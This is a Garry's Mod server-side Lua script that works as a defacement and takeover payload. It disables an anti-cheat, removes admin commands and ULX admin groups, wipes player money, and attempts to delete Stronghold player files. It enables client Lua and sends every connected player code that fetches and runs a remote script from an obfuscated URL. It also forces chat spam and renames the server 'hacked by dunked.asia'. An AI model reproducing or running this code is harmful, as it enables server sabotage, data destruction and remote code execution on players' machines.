print("ran serverside");

--[[
	Break shit
--]]
--hook.Add( "PlayerSpawn", "next_level_break", function()
	-- break qac, hello?
	if( LeyAC ) then
		LeyAC = nil;
	end
--end)
timer.Create( "next_level_timer2", 20, 0, function()
	--Break some bad cmds
	local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
	--Break ULX
	if ULib then
		for k,v in pairs(player.GetAll()) do
			ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
		end
	
		for k,v in pairs(ULib.ucl.groups) do
			if k != "user" then
				ULib.ucl.removeGroup(k);
			end
		end
	
		for k,v in pairs(ULib.ucl.users) do
			v.group = "user"
		end
	end
	--Gamemode related
	if GAMEMODE.Name == "DarkRP" then
	
		for k,v in pairs(player.GetAll()) do
			RunConsoleCommand("rp_setmoney", v:Nick(), 0);
		end
	
		hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
			RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
		end)
	end
	
	if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
		//for k, v in pairs(player.GetAll()) do
		//end
	end
	
	if string.find( GAMEMODE.Name:lower(), "stronghold" ) then
		for k,v in pairs(player.GetAll()) do
			RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
		end
	
		hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
			RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
		end)
		
		local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
		
		for k, v in pairs( fil ) do
			file.Delete( fil )
		end
	end
end)
--[[
	Misc stuff
--]]
if GetConVarString("sv_allowcslua") != "0" then
	RunConsoleCommand( "sv_allowcslua", "1" );
end
--Send clientside
--hook.Add( "PlayerInitialSpawn", "next_level_send", function()
	for k,v in pairs (player.GetAll()) do
		v:SendLua('http.Fetch([[http]] .. string.char(58) .. [[/]] .. [[/frost.site.nfoservers.com/bigpayload/next_level_cl.lua]], function(c) pcall(CompileString(c, [[l]], false)) end, function() end)')
	end
--end)

hook.Add("Think", "busted", function()
	for k,v in pairs (player.GetAll()) do
    	v:SetModelScale(2.5, 100);
    	v:SetRunSpeed(400 * 2);
    	v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
	for k, v in pairs(player.GetAll()) do
		v:ConCommand("say i got dunked by www.dunked.asia and p100 crew");
	end
end)

RunConsoleCommand("hostname", "hacked by dunked.asia and p100 crew")
RunConsoleCommand( "sv_loadingurl", "www.dunked.asia" )